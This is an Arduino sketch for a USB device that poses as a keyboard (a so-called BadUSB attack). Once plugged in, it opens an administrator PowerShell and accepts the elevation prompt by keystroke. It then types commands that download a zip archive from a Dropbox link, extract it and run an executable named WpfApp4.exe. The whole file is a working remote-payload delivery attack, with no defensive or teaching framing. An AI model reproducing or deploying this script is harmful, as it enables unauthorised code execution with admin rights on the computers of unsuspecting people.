#include "Keyboard.h"

void typeKey(uint8_t key) {
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup() {
  Keyboard.begin();
  delay(1200);

  // Open PowerShell as Administrator
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(1200);
  Keyboard.print(F("powershell Start-Process powershell -Verb runAs"));
  typeKey(KEY_RETURN);

  delay(2000);

  // Allow PowerShell execution
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.releaseAll();
  delay(2000);

  // PowerShell script to download, extract, and run the file
  // Скачивание, разархивирование и запуск программы через PowerShell
  Keyboard.print(F("$url=\"https://www.dropbox.com/scl/fo/70hvtndvrw9i408dc3fsi/AAjnD7jO2sXT84x2rlYbRdw?rlkey=d47w38cp82qogrmw6eex7bsab&st=na2edjhu&dl=1\";"));
  Keyboard.print(F("$zipFilePath=Join-Path -Path $env:USERPROFILE -ChildPath \"Downloads\\aaaa.zip\";"));
  Keyboard.print(F("Invoke-WebRequest -Uri $url -OutFile $zipFilePath;"));
  Keyboard.print(F("Expand-Archive -Path $zipFilePath -DestinationPath (Join-Path -Path $env:USERPROFILE -ChildPath \"Downloads\\Debug\") -Force;"));
  Keyboard.print(F("$exePath=Join-Path -Path (Join-Path -Path $env:USERPROFILE -ChildPath \"Downloads\\Debug\") -ChildPath \"WpfApp4.exe\";"));
  Keyboard.print(F("if (Test-Path $exePath) { Start-Process -FilePath $exePath } else { Write-Host \"Executable not found\" };"));
  Keyboard.print(F("exit;"));

  typeKey(KEY_RETURN);

  // End keyboard stream
  Keyboard.end();
}

void loop() {}
